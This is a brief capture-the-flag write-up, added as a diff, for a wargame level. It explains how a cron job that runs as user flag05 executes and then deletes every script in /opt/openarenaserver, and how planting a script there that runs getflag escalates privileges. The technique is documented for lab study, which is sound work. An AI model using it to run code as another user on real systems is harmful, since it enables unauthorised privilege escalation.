@@ -1,0 +1,16 @@
+When I first connected to level05 I had a message saying I had mail, so I looked in /var/mail/level05 and I saw
+
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+It's a crontab so I looked in this file
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+So i created a script in /opt/openarenaserver
+#!/bin/sh
+
+getflag > /tmp/flag and then cat /tmp/flag
